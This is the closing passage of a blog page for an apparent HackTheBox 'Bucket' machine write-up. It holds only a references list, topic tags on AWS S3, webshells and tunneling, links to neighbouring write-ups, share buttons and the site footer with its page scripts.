</code></pre></div><hr><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><ul><li><a href=https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3>https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3</a></li><li><a href=https://pd4ml.com/html.htm>https://pd4ml.com/html.htm</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/oscp-like/>OSCP-like</a></li><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/aws/>AWS</a></li><li><a href=https://fahmifj.github.io/tags/localstack/>LocalStack</a></li><li><a href=https://fahmifj.github.io/tags/s3/>S3</a></li><li><a href=https://fahmifj.github.io/tags/dynamodb/>DynamoDB</a></li><li><a href=https://fahmifj.github.io/tags/webshell/>Webshell</a></li><li><a href=https://fahmifj.github.io/tags/code-review/>Code-review</a></li><li><a href=https://fahmifj.github.io/tags/tunneling/>Tunneling</a></li><li><a href=https://fahmifj.github.io/tags/pd4ml/>PD4ML</a></li><li><a href=https://fahmifj.github.io/tags/gobuster/>Gobuster</a></li></ul><nav class=paginav><a class=prev href=https://fahmifj.github.io/writeups/hackthebox/htb-tabby/><span class=title>« Prev Page</span><br><span>HackTheBox - Tabby</span></a>
<a class=next href=https://fahmifj.github.io/writeups/hackthebox/htb-cascade/><span class=title>Next Page »</span><br><span>HackTheBox - Cascade</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Bucket&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-bucket%2f&hashtags=OSCP-like%2cLinux%2cAWS%2cLocalStack%2cS3%2cDynamoDB%2cWebshell%2cCode-review%2cTunneling%2cPD4ML%2cGobuster"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-bucket%2f&title=HackTheBox%20-%20Bucket&summary=HackTheBox%20-%20Bucket&source=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-bucket%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-bucket%2f&title=HackTheBox%20-%20Bucket"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-bucket%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Bucket%20-%20https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-bucket%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Bucket&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-bucket%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://fahmifj.github.io/>友人F</a></span>
<span>&#183;</span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script></body></html>